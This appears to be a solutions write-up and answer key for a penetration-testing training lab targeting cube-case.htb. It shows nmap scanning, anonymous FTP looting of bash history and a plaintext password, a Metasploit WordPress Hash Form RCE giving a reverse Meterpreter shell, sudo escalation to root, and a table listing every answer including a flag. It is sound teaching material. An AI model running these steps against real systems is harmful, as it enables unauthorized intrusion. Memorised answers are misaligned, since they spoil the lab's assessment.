
| Section                          | Question Number | Answer                                          |
| -------------------------------- | --------------- | ----------------------------------------------- |
| Low Hanging Fruits               | Question 1      | 8                                               |
| Low Hanging Fruits               | Question 2      | nginx 1.18.0                                    |
| Low Hanging Fruits               | Question 3      | cube-case.htb                                   |
| Linux Information Gathering      | Question 1      | WordPress\_Blog\_Setup\_Update.txt              |
| Linux Information Gathering      | Question 2      | john doe                                        |
| Linux Information Gathering      | Question 3      | full\_backup.tar.gz                             |
| Linux Information Gathering      | Question 4      | id\_rsa                                         |
| Linux Information Gathering      | Question 5      | 6.7.2                                           |
| Linux Information Gathering      | Question 6      | twentytwentyfive                                |
| Linux Initial Access             | Question 1      | ubuntu                                          |
| Linux Initial Access             | Question 2      | 5.15.0                                          |
| Linux Initial Access             | Question 3      | 33                                              |
| Linux Initial Access             | Question 4      | 1000                                            |
| Linux System Enumeration         | Question 1      | DirtyPipe                                       |
| Linux System Enumeration         | Question 2      | jammy                                           |
| Linux System Enumeration         | Question 3      | 1.9.9                                           |
| Linux System Enumeration         | Question 4      | 22.04                                           |
| Linux Vulnerability Assessment   | Question 1      | /etc/passwd                                     |
| Linux Vulnerability Assessment   | Question 2      | enabled                                         |
| Linux Vulnerability Assessment   | Question 3      | enabled                                         |
| Linux Vulnerability Assessment   | Question 4      | /snap/bin/lxc                                   |
| Linux Privilege Escalation       | Question 1      | 5                                               |
| Linux Privilege Escalation       | Question 2      | 0                                               |
| Linux Pillaging                  | Question 1      | HTB{kXjCFCRfXDHN3EcJ3kAq2Wu4ZWdJ3jeQpnJWMLwGBi} |
| Linux Pillaging                  | Question 2      | x86\_64                                         |
| Linux Pillaging                  | Question 3      | 3.0.5                                           |
| Linux Pillaging                  | Question 4      | 55                                              |
| Windows Information Gathering    | Question 1      | 19                                              |
| Windows Information Gathering    | Question 2      | WIN01                                           |
| Windows Information Gathering    | Question 3      | 1.12.4                                          |
| Windows Information Gathering    | Question 4      | 4                                               |
| Windows Information Gathering    | Question 5      | Devs                                            |
| Windows Initial Access           | Question 1      | FileServer01                                    |
| Windows Initial Access           | Question 2      | 2020-10-07                                      |
| Windows System Enumeration       | Question 1      | CorpBackupAgent                                 |
| Windows System Enumeration       | Question 2      | S-1-5-21-481531802-3248398329-2133938904-1002   |
| Windows System Enumeration       | Question 3      | 10.0.17763 N/A Build 17763                      |
| Windows System Enumeration       | Question 4      | 5                                               |
| Windows Vulnerability Assessment | Question 1      | Backup prep completed.                          |
| Windows Privilege Escalation     | Question 1      | CPU Usage                                       |
| Windows Privilege Escalation     | Question 2      | Code Injection                                  |
| Windows Pillaging                | Question 1      | 7d660ce6-fb54-4006-8446-5ae1b3ae1064            |
| Windows Pillaging                | Question 2      | C:\\Windows                                     |
| Windows Pillaging                | Question 3      | 4.2.5                                           |
| Windows Pillaging                | Question 4      | 198                                             |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Low Hanging Fruits

## Question 1

### "How many TCP ports in total are open on the target?"

After spawning the target, students will open a terminal and will use `nmap` to scan the target and obtain information about the open TCP ports by doing a service scan on all TCP ports, displaying only the open ports:

Code: shell

```shell
sudo nmap -sV -sC STMIP --open -p-
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-kocp4fq4pp]─[~]
└──╼ [★]$ sudo nmap -sV -sC 10.129.233.210 --open -p-

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 01:09 CDT
Nmap scan report for 10.129.233.210
Host is up (0.0077s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE          VERSION
21/tcp   open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [10.129.233.210]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http             nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 404 Not Found
443/tcp  open  ssl/http         Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=cube-case.htb/organizationName=Organization/stateOrProvinceName=State/countryName=US
| Not valid before: 2025-02-15T18:00:13
|_Not valid after:  2026-02-15T18:00:13
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: 400 Bad Request
|_http-generator: WordPress 6.7.2
8000/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| ssl-cert: Subject: commonName=VelociraptorServer/organizationName=Velociraptor
| Subject Alternative Name: DNS:VelociraptorServer, DNS:VelociraptorServer
| Not valid before: 2024-09-02T13:17:36
|_Not valid after:  2034-08-31T13:17:36
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8001/tcp open  ssl/vcom-tunnel?
| ssl-cert: Subject: commonName=VelociraptorServer/organizationName=Velociraptor
| Subject Alternative Name: DNS:VelociraptorServer, DNS:VelociraptorServer
| Not valid before: 2024-09-02T13:17:36
|_Not valid after:  2034-08-31T13:17:36
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http             Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
8889/tcp open  ssl/ddi-tcp-2?
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /app/index.html
|     Date: Thu, 20 Mar 2025 06:10:29 GMT
|     Content-Length: 38
|     href="/app/index.html">Found</a>.
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /app/index.html
|     Date: Thu, 20 Mar 2025 06:10:01 GMT
|     Content-Length: 38
|     href="/app/index.html">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Location: /app/index.html
|     Date: Thu, 20 Mar 2025 06:10:01 GMT
|_    Content-Length: 0
| ssl-cert: Subject: commonName=VelociraptorServer/organizationName=Velociraptor
| Subject Alternative Name: DNS:VelociraptorServer, DNS:VelociraptorServer
| Not valid before: 2024-09-02T13:17:36
|_Not valid after:  2034-08-31T13:17:36

<SNIP>
```

Answer: `8`

# Low Hanging Fruits

## Question 2

### "What service version is running on TCP port 80? (Format: service x.y.z)"

Students will go through the information of the previously run network scan to find the service version running on port 80 in the `VERSION` column:

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-kocp4fq4pp]─[~]
└──╼ [★]$ sudo nmap -sV -sC 10.129.233.210 --open -p-

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 01:09 CDT
Nmap scan report for 10.129.233.210
Host is up (0.0077s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE          VERSION

<SNIP>

80/tcp   open  http             {hidden} (Ubuntu)
|_http-server-header: {hidden} (Ubuntu)
|_http-title: 404 Not Found

<SNIP>
```

Answer: `nginx 1.18.0`

# Low Hanging Fruits

## Question 3

### "What is the commonName that the SSL certificate provides? (Format: example.com)"

Students will go through the information of the previously run network scan to find the `commonName` in the `ssl-cert: Subject:` parameter of port `443` (`HTTPS`):

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-kocp4fq4pp]─[~]
└──╼ [★]$ sudo nmap -sV -sC 10.129.233.210 --open -p-

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 01:09 CDT
Nmap scan report for 10.129.233.210
Host is up (0.0077s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE          VERSION

<SNIP>

443/tcp  open  ssl/http         Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName={hidden}/organizationName=Organization/stateOrProvinceName=State/countryName=US
| Not valid before: 2025-02-15T18:00:13
|_Not valid after:  2026-02-15T18:00:13
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: 400 Bad Request
|_http-generator: WordPress 6.7.2

<SNIP>
```

Answer: `cube-case.htb`

# Linux Information Gathering

## Question 1

### "What is the file name with the ".txt" extension that can be downloaded on the FTP server?"

After spawning the target, students will open a terminal and establish an FTP connection using the `ftp` command using the `anonymous:anonymous` credentials:

Code: shell

```shell
ftp STMIP
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-kocp4fq4pp]─[~]
└──╼ [★]$ ftp 10.129.178.209

Connected to 10.129.178.209.
220 ProFTPD Server (Debian) [10.129.178.209]
Name (10.129.178.209:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Subsequently, students will list directory contents to obtain the name of the text (`.txt` ) file hosted on the FTP service:

Code: shell

```shell
ls
```

```
ftp> ls

229 Entering Extended Passive Mode (|||8928|)
150 Opening ASCII mode data connection for file list
drwx------   3 john     john         4096 Feb 23 13:56 snap
-rw-rw-r--   1 john     john          964 Feb 15 22:14 {hidden}.txt
```

Answer: `WordPress_Blog_Setup_Update.txt`

# Linux Information Gathering

## Question 2

### "What is the full name of the development team member?"

Students will download the previously found text file locally within the established FTP session using the `get` command. They will query the contents using the `!cat` command to find the name of the person from the Development team:

Code: shell

```shell
get WordPress_Blog_Setup_Update.txt
!cat WordPress_Blog_Setup_Update.txt
```

```
ftp> get WordPress_Blog_Setup_Update.txt

local: WordPress_Blog_Setup_Update.txt remote: WordPress_Blog_Setup_Update.txt
229 Entering Extended Passive Mode (|||18884|)
150 Opening BINARY mode data connection for WordPress_Blog_Setup_Update.txt (964 bytes)
100% |*********************************************************************|   964      979.61 KiB/s    00:00 ETA
226 Transfer complete
964 bytes received in 00:00 (107.52 KiB/s)

ftp> !cat WordPress_Blog_Setup_Update.txt

**Subject: Update on WordPress Blog Setup**

Dear Team,

We are currently in the process of setting up a new blog using WordPress. 
To facilitate this setup, we have temporarily configured an FTP server at:

<SNIP>

Thank you for your cooperation.

Best Regards,
{hidden}
Development Team
```

Answer: `John Doe`

# Linux Information Gathering

## Question 3

### "What is the name of the ".tar.gz" file that has been moved to the "/mnt/backup/" directory?"

Students will list hidden directory contents within the previously established session to find the `.bash_history` file holding information about the command history and download the file:

Code: shell

```shell
ls -la
get .bash_history
```

```
ftp> ls -la

229 Entering Extended Passive Mode (|||29859|)
150 Opening ASCII mode data connection for file list
drwxr-x---   7 john     john         4096 Mar  6 08:35 .
drwxr-x---   7 john     john         4096 Mar  6 08:35 ..
-rw-rw-r--   1 john     john         1419 Mar  6 08:35 .bash_history
-rw-r--r--   1 john     john          220 Jan  6  2022 .bash_logout

<SNIP>
```

Subsequently, students will query the contents of the Linux command history (`.bash_history`) file to find commands related to backup creation using `tar` and the name of the backup that was created and moved to the `/mnt/backup/` directory:

Code: shell

```shell
!cat .bash_history
```

```
ftp> !cat .bash_history

cd /var/log
ls -la
tail -n 50 syslog

<SNIP>

cd /var/backups
ls -la
sudo tar -czf {hidden} /etc /var/log
sudo mv {hidden} /mnt/backup/

<SNIP>
```

Answer: `full_backup.tar.gz`

# Linux Information Gathering

## Question 4

### "What is the name of the private SSH key file?"

Students will change their current working directory in the previously established FTP session to the `.ssh/` directory and will list directory contents to find the name of the private SSH key:

Code: shell

```shell
cd .ssh/
ls
```

```
ftp> cd .ssh/

250 CWD command successful

ftp> ls 

229 Entering Extended Passive Mode (|||29312|)
150 Opening ASCII mode data connection for file list
-rw-------   1 john     john          565 Feb 26 20:16 authorized_keys
-rw-------   1 john     john         2602 Feb 12 13:55 {hidden}

<SNIP>
```

Answer: `id_rsa`

# Linux Information Gathering

## Question 5

### "What is the WordPress version running on the target? (Format: x.y.z)"

Students will exit from the previously established FTP session using the `exit` command:

Code: shell

```shell
exit
```

```
ftp> exit

221 Goodbye.
```

Next, students will use `cURL` to obtain the WordPress version running on port `443` (`HTTPS`) on the target within the `meta` HTML tag while using the `-k` parameter to allow for insecure server connections and grep for the `WordPress` string as found from the network scan results from the section:

Code: shell

```shell
curl https://STMIP -k | grep -i 'WordPress'
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-kocp4fq4pp]─[~]
└──╼ [★]$ curl https://10.129.178.209 -k | grep -i 'WordPress'

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:20 --:--:--     0
  
  <meta name="generator" content="WordPress {hidden}" />

<SNIP>
```

Answer: `6.7.2`

# Linux Information Gathering

## Question 6

### "What is the name of the theme used by WordPress on this target?"

Students will modify the previous `cURL` command to grep for the `/themes/` string to find the theme used on the target:

Code: shell

```shell
curl http://STMIP -k | grep -i '/themes/'
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-kocp4fq4pp]─[~]
└──╼ [★]$ curl https://10.129.178.209 -k | grep -i '/themes/'

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--  
  0
  
<SNIP>

@font-face{font-family:Beiruti;font-style:normal;font-weight:200 900;font-display:fallback;src:url('https://cube-case.htb/wp-content/themes/{hidden}/assets/fonts/beiruti/Beiruti-VariableFont_wght.woff2') format('woff2');}

<SNIP>
```

Answer: `twentytwentyfive`

# Linux Initial Access

## Question 1

### "After exploiting the WordPress plugin, what is the hostname of the Linux target?"

After spawning the target, students will open a terminal and will enumerate the plugins on the WordPress instance using `cURL`, finding the `hash-form` plugin:

Code: shell

```shell
curl -s -k https://STMIP | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-w3xn5blhrl]─[~]
└──╼ [★]$ curl -s -k https://10.129.45.54 | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

https://cube-case.htb/wp-content/plugins/hash-form/css/jquery.timepicker.css?ver=1.1.0
https://cube-case.htb/wp-content/plugins/hash-form/css/file-uploader.css?ver=1.1.0
https://cube-case.htb/wp-content/plugins/hash-form/fonts/materialdesignicons.css?ver=1.1.0
https://cube-case.htb/wp-content/plugins/hash-form/css/style.css?ver=1.1.0
"https://cube-case.htb/wp-content/plugins/hash-form/js/jquery.timepicker.min.js?ver=1.1.0" id="jquery-timepicker-js"></script>
"https://cube-case.htb/wp-content/plugins/hash-form/js/file-uploader.js?ver=1.1.0" id="hashform-file-uploader-js"></script>
"https://cube-case.htb/wp-content/plugins/hash-form/js/frontend.js?ver=1.1.0" id="frontend-js"></script>
```

Students will start the MSF console and search for exploits (modules) related to `hash_form`:

Code: shell

```shell
msfconsole -q
search hash_form
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-w3xn5blhrl]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> search hash_form

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_hash_form_rce    2024-05-23       excellent  Yes    WordPress Hash Form Plugin RCE
   1    \_ target: PHP In-Memory             .                .          .      .
   2    \_ target: Unix/Linux Command Shell  .                .          .      .
   3    \_ target: Windows Command Shell     .                .          .      .

Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/wp_hash_form_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'
```

Next, students will use the `use` command to begin interacting and configuring the `wp_hash_form_rce` exploit:

Code: shell

```shell
use 0
set RHOSTS STMIP
set RPORT 443
set SSL true
set LHOST tun0
```

```
[msf](Jobs:0 Agents:0) exploit(multi/http/wp_hash_form_rce) >> set RHOSTS 10.129.45.54

RHOSTS => 10.129.45.54

[msf](Jobs:0 Agents:0) exploit(multi/http/wp_hash_form_rce) >> set RPORT 443

RPORT => 443

[msf](Jobs:0 Agents:0) exploit(multi/http/wp_hash_form_rce) >> set SSL true

[!] Changing the SSL option's value may require changing RPORT!
SSL => true

[msf](Jobs:0 Agents:0) exploit(multi/http/wp_hash_form_rce) >> set LHOST tun0

LHOST => tun0
```

Subsequently, students will initiate the exploit and obtain a reverse meterpreter shell connection to the target. Note students may be required to run the exploit multiple times to obtain a shell:

Code: shell

```shell
exploit
```

```
[msf](Jobs:0 Agents:0) exploit(multi/http/wp_hash_form_rce) >> exploit

[*] Started reverse TCP handler on 10.10.14.60:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Detected Hash Form plugin version: 1.1.0
[+] The target appears to be vulnerable.
[*] Attempting to retrieve nonce from the target...
[+] Nonce retrieved: 4d2a3e8c45
[*] Uploading PHP payload using the retrieved nonce...
[+] PHP payload uploaded successfully to https://cube-case.htb/wp-content/uploads/hashform/temp/nsxbzcvq.php
[*] Triggering the payload...
[*] Sending stage (40004 bytes) to 10.129.45.54
[*] Meterpreter session 1 opened (10.10.14.60:4444 -> 10.129.45.54:40652) at 2025-03-20 02:40:18 -0500

(Meterpreter 1)(/var/www/cube-case.htb/wp-content/uploads/hashform/temp) > 
```

Students will use the `sysinfo` command to obtain information about the hostname in the `Computer` parameter in the output:

Code: shell

```shell
sysinfo
```

```
(Meterpreter 1)(/var/www/cube-case.htb/wp-content/uploads/hashform/temp) > sysinfo

Computer    : {hidden}

<SNIP>
```

Answer: `ubuntu`

# Linux Initial Access

## Question 2

### "What is the kernel version used by the Linux target? (Format: x.yy.z)"

Students will scrutinize the information from the `sysinfo` command to find the kernel version used by the target in the `OS` parameter:

```
(Meterpreter 1)(/var/www/cube-case.htb/wp-content/uploads/hashform/temp) > sysinfo

<SNIP>

OS          : Linux ubuntu {hidden}-135-generic #146-Ubuntu SMP Sat Feb 15 17:06:22 UTC 2025 x86_64

<SNIP>
```

Answer: `5.15.0`

# Linux Initial Access

## Question 3

### "What is the user id (uid) of the user www-data?"

Students will drop into a system command shell using the `shell` command and will use the `id` command to obtain the `userid` value of the `www-data` user:

Code: shell

```shell
shell
id
```

```
(Meterpreter 1)(/var/www/cube-case.htb/wp-content/uploads/hashform/temp) > shell

Process 1869 created.
Channel 0 created.

id
uid={hidden}(www-data) gid={hidden}(www-data) groups={hidden}(www-data),{hidden}(john)
```

Answer: `33`

# Linux Initial Access

## Question 4

### "What is the GID of the group "john"?"

Students will find the GID of the group `john` within the previously run command (`id`):

```
(Meterpreter 1)(/var/www/cube-case.htb/wp-content/uploads/hashform/temp) > shell

Process 1869 created.
Channel 0 created.

id
uid={hidden}(www-data) gid={hidden}(www-data) groups={hidden}(www-data),{hidden}(john)
```

Answer: `1000`

# Linux System Enumeration

## Question 1

### "What is the name of the CVE-2022-0847 vulnerability?"

Students will open `Firefox`, navigate to `https://google.com`, and search for the string `CVE-2022-0847 exploit` to find the name of the vulnerability:

![[HTB Solutions/Others/z. images/25be9bad2d2d4668816887bfae42cfa1_MD5.jpg]]

Answer: `DirtyPipe`

# Linux System Enumeration

## Question 2

### "What is the Codename of the Linux distribution?"

After spawning the target, students will open a terminal and establish an FTP session using the `anonymous:anonymous` credentials to download the `.bash_history` file:

Code: shell

```shell
ftp STMIP
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-1jmb1dufyr]─[~]
└──╼ [★]$ ftp 10.129.233.210

Connected to 10.129.233.210.
220 ProFTPD Server (Debian) [10.129.233.210]
Name (10.129.233.210:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> get .bash_history

local: .bash_history remote: .bash_history
229 Entering Extended Passive Mode (|||11706|)
150 Opening BINARY mode data connection for .bash_history (1419 bytes)
100% |***********************************|  1419        1.33 MiB/s    00:00 ETA
226 Transfer complete
```

Subsequently, students will use the `exit` command to terminate the FTP session and will query the contents of the `.bash_history` file, obtaining the password for the user `john`:

Code: shell

```shell
exit
cat .bash_history
```

```
ftp> exit

221 Goodbye.

┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-1jmb1dufyr]─[~]
└──╼ [★]$ cat .bash_history 

cd /var/log
ls -la
tail -n 50 syslog

<SNIP>

sudo mv full_backup.tar.gz /mnt/backup/
cd /mnt/backup
echo "john:SuperSecurePass123" | sudo chpasswd
sudo chmod 600 /mnt/backup/full_backup.tar.gz
sudo du -sh /mnt/backup

<SNIP>
```

Next, students will establish an SSH session to the target using the found password for the user `john`:

Code: shell

```shell
ssh john@STMIP
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-1jmb1dufyr]─[~]
└──╼ [★]$ ssh john@10.129.233.210

hostkeys_find_by_key_hostfile: hostkeys_foreach failed for /home/htb-ac-8414/.ssh/known_hosts: Not a directory
The authenticity of host '10.129.233.210 (10.129.233.210)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/htb-ac-8414/.ssh/known_hosts).
john@10.129.233.210's password: 
client_input_hostkeys: hostkeys_foreach failed for /home/htb-ac-8414/.ssh/known_hosts: Not a directory
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-135-generic x86_64)

<SNIP>

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Mar  6 08:33:30 2025 from 10.10.16.14
john@ubuntu:~$ 
```

Students will query the contents of the `/etc/os-release` file to obtain information about the codename used in the Linux distribution in the `VERSION_CODENAME` (or the `UBUNTU_CODENAME`) parameter:

Code: shell

```shell
cat /etc/os-release
```

```
john@ubuntu:~$ cat /etc/os-release 

<SNIP>

VERSION_CODENAME={hidden}

<SNIP>
```

Answer: `jammy`

# Linux System Enumeration

## Question 3

### "Which sudo version is installed on the Linux target? (Format: x.y.z)"

Students will use the `sudo --version` command to obtain the version of the `sudo` utility within the target and the previously established SSH session:

Code: shell

```shell
sudo --version
```

```
john@ubuntu:~$ sudo --version

Sudo version {hidden}

<SNIP>
```

Answer: `1.9.9`

# Linux System Enumeration

## Question 4

### "What is the release no. of Ubuntu running on the target? (Format: xx.yy)"

Students will reuse the previously obtained information from the `/etc/os-release` file to find the release number of Ubuntu in the `VERSION_ID` parameter:

Code: shell

```shell
cat /etc/os-release
```

```
john@ubuntu:~$ cat /etc/os-release 

<SNIP>

NAME="Ubuntu"
VERSION_ID="{hidden}"

<SNIP>
```

Answer: `22.04`

# Linux Vulnerability Assessment

## Question 1

### "What is the full path of the "passwd" file?"

After spawning the target, students will open a terminal and establish an SSH session using the previously found credentials (`john:SuperSecurePass123`):

Code: shell

```shell
ssh john@STMIP
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-5c4k6mvkvt]─[~]
└──╼ [★]$ ssh john@10.129.4.11

The authenticity of host '10.129.4.11 (10.129.4.11)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.4.11' (ED25519) to the list of known hosts.
john@10.129.4.11's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-135-generic x86_64)

<SNIP>

Last login: Thu Mar  6 08:33:30 2025 from 10.10.16.14
john@ubuntu:~$
```

Students will use the `find` command and will look for files containing the string `passwd` in the `/etc` directory:

Code: shell

```shell
find /etc -type f -name "passwd" 2>/dev/null
```

```
john@ubuntu:~$ find /etc -type f -name "passwd" 2>/dev/null

/etc/pam.d/passwd
/etc/{hidden}
```

Answer: `/etc/passwd`

# Linux Vulnerability Assessment

## Question 2

### "What is the status of "User namespace" protection?"

Students will query the `/proc/self/uid_map` file to find if the `User namespace` protection is enabled simply by checking if there is any output, which essentially is how `LinPEAS` executes this check:

Code: shell

```shell
cat /proc/self/uid_map 2>/dev/null
```

```
john@ubuntu:~$ cat /proc/self/uid_map 2>/dev/null

         0          0 4294967295
```

Answer: `enabled`

# Linux Vulnerability Assessment

## Question 3

### "What is the status of ASLR protection?"

Students will query the `/proc/self/kernel/randomize_va_space` file to find if the `ASLR` protection is enabled simply by checking the decimal output. If it is `0`, then it is not disabled. If it is otherwise, it is disabled, which is essentially how `LinPEAS` executes and compares the output of this check:

Code: shell

```shell
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
```

```
john@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space 2>/dev/null

2
```

Answer: `enabled`

# Linux Vulnerability Assessment

## Question 4

### "What is the full path of the container tool present on the target system?"

Students will use the `command` command to query for container-related tools such as `docker`, `lxc`, `rkt`, `kubectl`, `podman`, and `runc` to find the full path of the container tool present on the target:

Code: shell

```shell
command -v docker lxc rkt kubectl podman runc
```

```
john@ubuntu:~$ command -v docker lxc rkt kubectl podman runc

/snap/bin/{hidden}
```

Answer: `/snap/bin/lxc`

# Linux Privilege Escalation

## Question 1

### "How many functions can be exploited with the "nano" binary based on GTFObins?"

Students will open `Firefox`, navigate to `https://gtfobins.github.io/`, and search for `nano` to find the number of functions that could be used to bypass security restrictions by escalating or reading files owned by other users:

![[HTB Solutions/Others/z. images/d78cb535f936e3e1eae1f2f6b7379792_MD5.jpg]]

Answer: `5`

# Linux Privilege Escalation

## Question 2

### "What is the UID of the user root?"

Students will open a terminal and establish an SSH session with the target using the previously found credentials (`john:SuperSecurePass123`):

Code: shell

```shell
ssh john@STMIP
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-mvscj4htyw]─[~]
└──╼ [★]$ ssh john@10.129.233.210

The authenticity of host '10.129.233.210 (10.129.233.210)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.233.210' (ED25519) to the list of known hosts.
john@10.129.233.210's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-135-generic x86_64)

<SNIP>

Last login: Thu Mar  6 08:33:30 2025 from 10.10.16.14
john@ubuntu:~$
```

Subsequently, students will query the `/etc/passwd` file and grep for the `root` user (string) to find the user id (UID) in the third value of the output:

Code: shell

```shell
grep root /etc/passwd
```

```
john@ubuntu:~$ grep root /etc/passwd

root:x:{hidden}:0:root:/root:/bin/bash
```

Answer: `0`

# Linux Pillaging

## Question 1

### "Submit the contents of the "/root/flag.txt" as the answer"

After spawning the target, students will open a terminal and establish an SSH session using the previously found credentials (`john:SuperSecurePass123`):

Code: shell

```shell
ssh john@STMIP
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-3pnfwlbxoi]─[~]
└──╼ [★]$ ssh john@10.129.204.203

The authenticity of host '10.129.204.203 (10.129.204.203)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.203' (ED25519) to the list of known hosts.
john@10.129.204.203's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-135-generic x86_64)

<SNIP>

Last login: Thu Mar  6 08:33:30 2025 from 10.10.16.14
john@ubuntu:~$ 
```

Students will list the privileges and commands that the user `john` can run as other users such as `root` to find the user can execute `nano` and all commands/utilities present on the target machine as the `root` user:

Code: shell

```shell
sudo -l
```

```
john@ubuntu:~$ sudo -l

Matching Defaults entries for john on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User john may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nano
    (ALL : ALL) ALL
```

Subsequently, students will use the `su` to change the user context from `john` to the `root` user. Additionally, students will be prompted to submit the password `SuperSecurePass123`:

Code: shell

```shell
sudo su
```

```
john@ubuntu:~$ sudo su

[sudo] password for john: 
root@ubuntu:/home/john# 
```

Students will query the contents of the `flag.txt` file located in the `/root` directory to obtain the flag:

Code: shell

```shell
cat /root/flag.txt
```

```
root@ubuntu:/home/john# cat /root/flag.txt

{hidden}
```

